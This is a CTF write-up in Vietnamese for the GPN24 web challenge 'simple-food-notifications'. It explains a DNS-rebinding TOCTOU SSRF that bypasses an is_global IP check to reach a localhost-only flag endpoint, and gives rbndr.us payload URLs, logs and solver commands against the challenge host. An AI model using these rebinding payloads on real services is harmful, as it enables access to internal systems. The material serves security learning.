# simple-food-notifications — writeup

## Tóm tắt

Bài web này có một lỗi **TOCTOU SSRF qua DNS rebinding**.

Ứng dụng cho phép người dùng nhập một URL thông báo qua `/order`. Ở background thread, server sẽ:

1. `sleep` ngẫu nhiên 5–15 giây.
2. `resolve` hostname bằng `socket.getaddrinfo(...)` và kiểm tra mọi IP phải là `is_global`.
3. Sau đó mới dùng `urllib3.request('GET', url, ...)` để gửi request thật.

Vấn đề là bước **kiểm tra DNS** và bước **request thật** dùng **hai lần resolve khác nhau**. Nếu lần đầu hostname trả về IP public để qua filter, nhưng lần sau lại trả về `127.0.0.1`, request thật sẽ đi vào endpoint nội bộ `/vip-meal` và nội dung phản hồi sẽ bị lưu vào `/notification/<id>`.

---

## Phân tích source

Đoạn quan trọng trong `app/app.py`:

```python
@app.route('/vip-meal')
def vip_meal():
    if request.remote_addr != "127.0.0.1":
        return render_template('meal.html', message="You are not dressed appropriate to see even vip meals."), 401

    return render_template(
        'meal.html',
        title="VIP Meal",
        message=f"Our chef cooked the beast meal for our vip customers, here is the flag {FLAG} with some caviar on top."
    ), 200
```

Endpoint này chỉ nhả flag nếu request đến từ `127.0.0.1`.

Luồng xử lý order:

```python
def create_meal(id, url, *args, **kwargs):
    notifications[id] = {
        "message": f"We are working professionally on your meal and will notify you at {url} as soon as it's ready, please wait patiently.",
        "status": "COOKING"
    }
    time.sleep(randomBetween(5, 15))

    try:
        addresses = socket.getaddrinfo(urllib3.util.parse_url(url).host, 80)
    except Exception:
        notifications[id] = {"message": "...", "status": "FAILED"}
        return

    for addr in addresses:
        if (not ipaddress.ip_address(addr[4][0]).is_global):
            notifications[id] = {
                "message": "Only staff is allowed to see mess in the kitchen, we don't want you to see the rats.",
                "status": "REJECTED"
            }
            return

    try:
        r = urllib3.request('GET', url, redirect=False, timeout=urllib3.Timeout(30))
        notifications[id] = {"message": r.data.decode('utf-8', errors='replace'), "status": "DONE"}
    except Exception:
        notifications[id] = {"message": "...", "status": "FAILED"}
```

Lỗi nằm ở đây:

- `getaddrinfo(...)` chỉ dùng để kiểm tra.
- `urllib3.request(...)` sẽ tự resolve lại hostname khi connect.
- Không có gì ràng buộc lần resolve thứ hai phải giống lần đầu.

Vì vậy có thể **DNS rebind** giữa hai thời điểm.

---

## Chi tiết môi trường DNS

`entrypoint.sh` chạy `dnsmasq` local và ghi đè resolver:

```bash
dnsmasq --user=root &
echo "nameserver 127.0.0.1" > /etc/resolv.conf
exec python /app/app.py
```

Cấu hình `dnsmasq.conf`:

```conf
min-cache-ttl=2
server=8.8.8.8
listen-address=127.0.0.1
no-resolv
```

Ý nghĩa của `min-cache-ttl=2` là kết quả DNS sẽ bị cache ít nhất 2 giây. Đây là yếu tố khiến exploit remote không ổn định: nếu IP “global” chết quá nhanh hoặc timing không đẹp, lần fetch thật có thể vẫn dùng IP cũ hoặc fail trước khi rebind sang localhost.

---

## Ý tưởng khai thác

Ta cần một hostname sao cho:

- **Lần resolve thứ nhất** trả IP public → qua check `is_global`.
- **Lần resolve thứ hai** trả `127.0.0.1` → request thật đi vào `/vip-meal` với `remote_addr = 127.0.0.1`.

Sau đó response HTML của `/vip-meal` sẽ được copy nguyên vào `notifications[id]["message"]`, và có thể đọc qua:

```text
GET /notification/<id>
```

### Vì sao self-SSRF không đủ?

Thử trực tiếp:

```text
https://<public-host>/vip-meal
```

hoặc

```text
http://<public-host>/vip-meal
```

Kết quả thực tế từ log:

- `https://public-host/vip-meal` trả về HTML của `/vip-meal`, nhưng message là:
  `You are not dressed appropriate to see even vip meals.`
- Điều này chứng tỏ request đã chạm đúng route, **nhưng đi qua frontend/proxy public**, nên `request.remote_addr` không phải `127.0.0.1`.

Do đó cần DNS rebinding để request thật đi thẳng vào loopback bên trong container.

---

## POC local

Ở local, mình dựng một DNS server nhỏ cho hostname `reb.local`:

- lần query đầu trả `1.2.3.4`
- lần query sau trả `0.0.0.0`

`0.0.0.0` trên Linux thường connect về local service đang listen trên mọi interface, nên trong local test nó đủ để vào Flask app và thỏa điều kiện nội bộ.

Payload local:

```text
http://reb.local:8000/vip-meal
```

### Kết quả local

Log local đã xác nhận đầy đủ exploit path:

```text
[+] POST /order HTTP 200
[+] payload=http://reb.local:8000/vip-meal
[+] notification id: t4vrxp7dvj
...
[poll 10] status=DONE message='<!DOCTYPE html>...<title>VIP Mea'
[+] DNS query log:
    from=127.0.0.1:39708 q=reb.local type=1 -> 1.2.3.4
    from=127.0.0.1:39708 q=reb.local type=28 -> NOAAAA
    from=127.0.0.1:50523 q=reb.local type=1 -> 0.0.0.0
    from=127.0.0.1:50523 q=reb.local type=28 -> NOAAAA
[+] local FLAG FOUND: GPNCTF{LOCAL_REBIND_PROOF_FLAG}
[+] proof: extracted flag equals /flag contents and came from /notification DONE response.
```

Đây là bằng chứng rõ ràng cho bug:

1. Lần DNS đầu trả IP public giả (`1.2.3.4`) để qua filter.
2. Lần DNS sau trả `0.0.0.0` để request thật quay về local.
3. `/notification/<id>` chứa HTML của `VIP Meal` và flag.

---

## Thử nghiệm remote

Với remote, dùng các payload kiểu:

```text
http://<public>.<local>.rbndr.us/vip-meal
```

Ví dụ:

```text
http://01010101.7f000001.rbndr.us/vip-meal
http://0bffff01.7f000001.rbndr.us/vip-meal
http://0bfffffe.7f000001.rbndr.us/vip-meal
```

### Các trạng thái quan sát được

#### 1. `REJECTED`

Ví dụ log:

```text
[poll 04] status=REJECTED message="Only staff is allowed to see mess in the kitchen, we don't want you to see the rats."
```

Điều này có nghĩa là **ngay bước preflight** đã resolve ra IP local/non-global, nên bị chặn trước khi fetch thật.

#### 2. `FAILED`

Ví dụ log:

```text
[poll 06] status=FAILED message='Our server slipped on a banana peel while trying to notify you...'
```

Đây là dấu hiệu preflight có thể đã pass, nhưng fetch thật không thành công. Nguyên nhân có thể là:

- cache DNS 2 giây làm lần connect chưa kịp rebind đúng lúc,
- IP public đầu tiên fail quá nhanh hoặc theo cách không tạo retry thuận lợi,
- rbndr trả chuỗi resolve không ổn định đúng thời điểm.

#### 3. `DONE` nhưng không có flag

Ví dụ self-SSRF:

```text
[poll 07] status=DONE message='...You are not dressed appropriate to see even vip meals...'
```

Nghĩa là request thật tới được `/vip-meal`, nhưng **không phải từ 127.0.0.1**.

---

## Vì sao exploit remote khó ổn định hơn local?

Local POC dễ hơn vì mình kiểm soát hoàn toàn DNS trả lời theo đúng thứ tự mong muốn.

Remote khó hơn do:

1. Có `sleep(randomBetween(5,15))` trước lúc resolve, nên timing khó đoán.
2. `dnsmasq` cache tối thiểu 2 giây.
3. `rbndr.us` không cho mình kiểm soát tuyệt đối query nào trả IP nào ở đúng thời điểm mong muốn.
4. Có thể còn proxy / LB phía trước hostname public, khiến self-SSRF không đi vào loopback thật.

Nói ngắn gọn: **bug là thật và local exploit được**, nhưng để “bóp” remote thành flag cần brute-force timing/IP tốt hơn hoặc một DNS setup rebinding ổn định hơn từ phía người chơi.

---

## Script hỗ trợ

Trong quá trình làm, mình đã viết các solver sau:

- `solve_simple_food_notifications.py`
- `solve_simple_food_notifications_v3.py`
- `solve_simple_food_notifications_v4.py`

Các script này lần lượt:

- dựng local proof,
- thử self-SSRF và rbndr,
- phân loại kết quả `REJECTED / FAILED / DONE`,
- chọn candidate IP global có timing tốt hơn.

---

## Kết luận

Lỗ hổng cốt lõi của bài là:

- **TOCTOU SSRF do DNS resolution bị tách khỏi request thật**.

Chuỗi khai thác là:

1. gửi `/order` với một hostname rebinding,
2. để lần resolve đầu vượt qua `is_global`,
3. để lần resolve sau đổi sang `127.0.0.1`,
4. ép server tự gọi `/vip-meal`,
5. đọc HTML chứa flag từ `/notification/<id>`.

Phần local đã được chứng minh đầy đủ bằng log và flag local. Phần remote đã xác nhận được exploit path bằng các trạng thái `DONE/REJECTED/FAILED`, nhưng trong các lần chạy hiện có vẫn chưa lấy được remote flag cuối cùng.

---

## Phụ lục: lệnh chạy đã dùng

### Local proof

```bash
python3 solve_simple_food_notifications.py \
  --local \
  --challenge-dir /path/to/simple-food-notifications
```

### Remote thử self-SSRF

```bash
python3 solve_simple_food_notifications_v3.py \
  https://glazed-paella-atop-cured-harissa-ts13.gpn24.ctf.kitctf.de \
  --self-only \
  --attempts 5
```

### Remote thử rbndr

```bash
python3 solve_simple_food_notifications_v3.py \
  https://glazed-paella-atop-cured-harissa-ts13.gpn24.ctf.kitctf.de \
  --rbndr-only \
  --attempts 25 \
  --try-zero
```

### Remote probe candidate tốt hơn

```bash
python3 solve_simple_food_notifications_v4.py \
  https://glazed-paella-atop-cured-harissa-ts13.gpn24.ctf.kitctf.de \
  --probe-rounds 1 \
  --attempts 20
```
